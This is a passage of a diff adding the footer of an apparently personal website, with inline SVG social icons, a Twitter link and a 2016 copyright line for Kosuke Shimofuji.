+	S46.646,29.299,49.23,29.299z M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M62.501,35.182
+	c0,7.247-5.84,13.135-13.098,13.278c-1.916,3.813-0.003,5.578,1.468,6.328c0,0,0.298,0.151,0.95,0.388
+	c0.239,0.076,0.391,0.107,0.391,0.107s-0.002,0.011-0.003,0.03c0.457,0.155,1.04,0.338,1.76,0.534
+	c0.876,0.146,1.723,0.347,2.533,0.601c0.003,0,0.008,0.002,0.013,0.003c0,0,0.013,0.003,0.017,0.006
+	c1.336,0.421,2.569,0.983,3.664,1.659c0.451,0.259,0.86,0.529,1.16,0.798l0.002,0.002c2.335,1.799,3.819,4.205,3.981,6.916
+	c0.364,6.147-6.211,11.533-14.684,12.029C42.18,78.357,35.016,73.777,34.65,67.63c-0.257-4.348,2.959-8.313,7.859-10.438
+	c-5.216-4.507-2.277-8.819-0.432-10.731c-3.786-2.345-6.308-6.519-6.308-11.279c0-7.337,5.984-13.284,13.365-13.284
+	c2.213,0,4.297,0.537,6.134,1.483c0,0,3.796,1.554,10.098-1.483v8.16h0.002c0,0-1.893,0.859-3.395,1.421
+	C62.314,32.655,62.501,33.897,62.501,35.182z"/>
+</svg>
+
+</a>
+    <a href="https://twitter.com/KosukeShimofuji"><?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
+<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" xml:space="preserve">
+<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M76.666,38.556
+	c0.023,0.547,0.037,1.096,0.037,1.646c0,16.818-12.801,36.211-36.211,36.211c-7.188,0-13.877-2.106-19.51-5.717
+	c0.996,0.116,2.01,0.177,3.037,0.177c5.963,0,11.449-2.034,15.807-5.448c-5.57-0.102-10.271-3.782-11.891-8.838
+	c0.777,0.148,1.574,0.229,2.395,0.229c1.162,0,2.285-0.156,3.354-0.447C27.862,55.2,23.475,50.056,23.475,43.89
+	c0-0.053,0-0.106,0-0.16c1.717,0.954,3.68,1.526,5.766,1.593c-3.416-2.282-5.662-6.178-5.662-10.594c0-2.332,0.627-4.52,1.723-6.398
+	c6.277,7.699,15.656,12.768,26.234,13.299c-0.219-0.933-0.332-1.904-0.332-2.901C51.203,31.698,56.904,26,63.932,26
+	c3.66,0,6.969,1.545,9.289,4.02c2.9-0.571,5.623-1.63,8.082-3.089c-0.949,2.972-2.969,5.467-5.596,7.041
+	c2.574-0.308,5.027-0.992,7.309-2.004C81.311,34.52,79.152,36.762,76.666,38.556z"/>
+</svg>
+</a>
+    <br><br>
+    <div id="footer-copyright">&copy; 2016 Kosuke Shimofuji. All rights reserved.</div>
+  </div>
+</footer>
+
+
+  </body>
+
+</html>
